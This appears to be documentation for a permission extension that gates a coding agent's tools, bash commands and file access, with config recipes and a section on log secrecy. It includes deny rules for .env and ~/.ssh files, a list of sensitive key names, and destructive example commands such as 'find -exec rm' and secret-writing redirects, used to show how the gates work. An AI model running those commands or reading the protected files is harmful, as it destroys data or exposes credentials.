Path: `~/.pi/agent/agents/<agent>.md` (respects `PI_CODING_AGENT_DIR`)

```yaml
---
name: my-agent
permission:
  read: allow
  write: deny
  mcp: allow
  bash:
    git *: ask
    git status: allow
  mcp:
    chrome_devtools_*: deny
    exa_*: allow
  skill:
    "*": ask
---
```

### Project Agent Override

Path: `<cwd>/.pi/agents/<agent>.md`

Project agent files are resolved from Pi's current session `cwd`, so they are workspace-specific and do **not** move under `PI_CODING_AGENT_DIR`.

### Frontmatter Limitations

The frontmatter parser is intentionally minimal.
Use only `key: value` scalars and nested maps.
Avoid arrays, multi-line scalars, and YAML anchors.

---

## Common Recipes

### Protect Sensitive Files

```jsonc
{
  "permission": {
    "*": "ask",
    "read": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    },
    "write": {
      "*": "ask",
      "*.lock": "deny"
    }
  }
}
```

### Read-Only Mode

```jsonc
{
  "permission": {
    "*": "ask",
    "read": "allow",
    "grep": "allow",
    "find": "allow",
    "ls": "allow",
    "write": "deny",
    "edit": "deny"
  }
}
```

### Restricted Bash Surface

```jsonc
{
  "permission": {
    "*": "ask",
    "bash": {
      "*": "deny",
      "git status": "allow",
      "git diff": "allow",
      "git log *": "allow"
    }
  }
}
```

### Read-Only Bash Command Allowlist

The [Read-Only Mode](#read-only-mode) recipe above gates *tools*; this one gates the *bash* surface.
It allows a curated set of commands whose only effect is to read or report — none can create or modify a file, register, or system state by itself — while every other command falls through to `ask`.

```jsonc
{
  "permission": {
    "*": "ask",
    "write": "deny",
    "edit": "deny",
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "~/.ssh/*": "deny"
    },
    "bash": {
      "*": "ask",

      // File inspection
      "cat *": "allow",
      "head *": "allow",
      "tail *": "allow",
      "less *": "allow",
      "more *": "allow",

      // Listing and metadata
      "ls *": "allow",
      "tree *": "allow",
      "stat *": "allow",
      "file *": "allow",
      "wc *": "allow",
      "du *": "allow",
      "df *": "allow",

      // Search (find/fd with -exec are auto-floored to ask)
      "grep *": "allow",
      "egrep *": "allow",
      "fgrep *": "allow",
      "rg *": "allow",
      "find *": "allow",
      "fd *": "allow",

      // Comparison and hashing
      "diff *": "allow",
      "cmp *": "allow",
      "comm *": "allow",
      "md5sum *": "allow",
      "sha1sum *": "allow",
      "sha256sum *": "allow",
      "cksum *": "allow",

      // System info
      "pwd": "allow",
      "whoami": "allow",
      "id": "allow",
      "hostname": "allow",
      "uname *": "allow",
      "date": "allow",
      "uptime": "allow",
      "ps *": "allow",
      "printenv *": "allow",
      "which *": "allow",
      "type *": "allow",

      // Git read-only subcommands (never a broad "git *")
      "git status": "allow",
      "git diff *": "allow",
      "git log *": "allow",
      "git show *": "allow",
      "git blame *": "allow",
      "git ls-files *": "allow",
      "git branch": "allow",
      "git remote -v": "allow"
    }
  }
}
```

Four existing behaviors keep this allowlist safe — you do not have to enumerate the destructive commands to block them:

1. **Redirects are gated by the `path` surface, not `bash`.**
   Allowing `cat *` allows the `cat` command, not a redirect it carries: `cat secret > out.txt` writes `out.txt` through the `path`/`external_directory` gate.
   That is why this recipe ships with `write` and `edit` denied and a `path` deny block for sensitive files.
   Keep the `path` surface locked down for anything you would not want an allowed read command to overwrite via `>`.
2. **`find`/`fd` with an exec flag are floored to `ask`.**
   A bare `find *` search is read-only, so it is safe to allow; the moment an exec flag appears (`find -exec`/`-execdir`/`-ok`/`-okdir`, `fd -x`/`-X`), the [indirection-wrapper floor](#fail-closed-behavior) clamps the decision back to `ask`.
   So `find . -type f -exec rm {} +` still prompts even under `find *: allow`.
3. **Chained commands resolve most-restrictive.**
   `find . -name '*.log' && rm -f found.log` decomposes into `find …` and `rm …`; `rm` matches only `"*": "ask"`, and the most restrictive result governs the whole invocation, so the chain prompts.
4. **Wrappers cannot ride the allowlist.**
   `sudo grep …`, `env X=1 cat …`, `sh -c "…"`, and `eval "…"` are floored to `ask` (the [wrapper floors](#fail-closed-behavior)), so an allowed command cannot be smuggled past through a wrapper.

`git` is enumerated by read subcommand rather than a broad `git *`, because `git` has mutating subcommands (`commit`, `push`, `branch -D`, `remote add`, `config <key> <value>`).
Exact patterns like `git status` and `git branch` match only their literal form, so `git branch -D feature` falls through to `"*": "ask"`.
The `*`-suffixed git patterns (`git diff *`, `git log *`) are safe because those subcommands are read-only regardless of their arguments.

Commands that can originate a write are deliberately omitted: `echo` and `printf` are the usual content source for a `>` redirect, `tee` writes its input to a file, and `sort -o`, `sed -i`, and in-place `awk` redirects modify files directly.
Add them only if you understand that pairing them with `write: deny` and a strict `path` surface is what keeps them from writing.

### MCP Discovery Only

```jsonc
{
  "permission": {
    "*": "ask",
    "mcp": {
      "*": "ask",
      "mcp_status": "allow",
      "mcp_list": "allow",
      "mcp_search": "allow",
      "mcp_describe": "allow"
    }
  }
}
```

### Per-Agent Lockdown

In the global Pi agents directory (default: `~/.pi/agent/agents/reviewer.md`, respects `PI_CODING_AGENT_DIR`):

```yaml
---
permission:
  write: deny
  edit: deny
  bash: deny
---
```

---

## Pi Integration Hooks

The extension integrates via Pi's lifecycle hooks:

| Hook                 | Behavior                                                                                                                            |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `before_agent_start` | Filters the active tool set (restrict-only), narrows the `Available tools:` system-prompt listing to match, and hides denied skills |
| `tool_call`          | Enforces permissions for every tool invocation                                                                                      |
| `input`              | Intercepts `/skill:<name>` requests and enforces skill policy                                                                       |

Additional behaviors:

- Unknown/unregistered tools are blocked before permission checks (prevents bypass attempts)
- Tool filtering is restrict-only: the active set starts from pi's already-active tools (`pi.getActiveTools()`) and only ever has denied tools removed — the permission system never activates a tool pi left off by default (e.g. `find`, `grep`, `ls`)
- The `Available tools:` system prompt section is narrowed to match the filtered active tool set: denied tools' lines are dropped, the rest are kept, and the section is removed entirely only when no tool is allowed
- The narrowed prompt is recomputed and returned on every turn but is byte-stable for a stable policy/agent, so the provider's prompt cache (tools + system prefix) is preserved rather than rewritten each turn
- Extension-provided tools like `task`, `mcp`, and third-party tools are handled by exact registered name
- Generic extension-tool approval prompts include a bounded input preview; built-in file tools use concise human-readable summaries
- Permission review logs include bounded `toolInputPreview` values for non-bash/non-MCP tool calls, with sensitive-keyed values masked (see [Log file sensitivity](#log-file-sensitivity))

---

## Log file sensitivity

The review log is enabled by default and records what the agent actually did, which means it records payload as well as decisions: the complete bash command string for every bash decision, and a bounded JSON preview of the tool input for other tools.
The debug log carries the same payload when `debugLog` is on.

Two protections apply.

Both logs are created **owner-only** (`0600`, in a `0700` directory), and a log created by an earlier version is tightened on the next write.
The permission-forwarding request and response files are written the same way.
This closes the shared-host case: another user on the same machine cannot read them.

Values bound to a **sensitive key name** — `authorization`, `token`, `secret`, `password`, `credential`, `cookie`, `api_key`, `private_key`, matched case-insensitively — are masked as `[redacted]` before anything is written.
So a tool called with `{"authorization": "Bearer …"}` records `{"authorization": "[redacted]"}`.

The boundary is worth stating exactly, because it is easy to over-read:

> A value bound to a sensitive key name is masked; a secret embedded in a bash command string is not.

A command string has no keys, so `deploy --token abc123` is logged verbatim.
The extension deliberately does not try to guess which parts of a command look secret-shaped — see [ADR 0010] for the measured reasoning.

Practical guidance:

- Treat both log files as sensitive when sharing them: scrub before pasting into an issue or a chat.
- Set `"permissionReviewLog": false` (and leave `debugLog` off) for a session that will handle credentials on the command line.
- Owner-only modes do not protect against anything running as you, including a backup or cloud-sync agent that copies your home directory.

[ADR 0010]: https://github.com/gotgenes/pi-packages/blob/main/packages/pi-permission-system/docs/decisions/0010-permission-log-secret-exposure.md

---

## Schema Validation

Validate your config against the included schema:

```bash
npx --yes ajv-cli@5 validate \
  -s ./schemas/permissions.schema.json \
  -d ./config.json
```

**Editor tip:** Add the hosted schema URL as the `$schema` key in your config for autocomplete and validation support:

```json
"$schema": "https://raw.githubusercontent.com/gotgenes/pi-packages/main/packages/pi-permission-system/schemas/permissions.schema.json"
```

The schema is generated from the extension's zod source of truth (`src/config-schema.ts`); regenerate it with `pnpm run gen:schema` after changing the config shape.
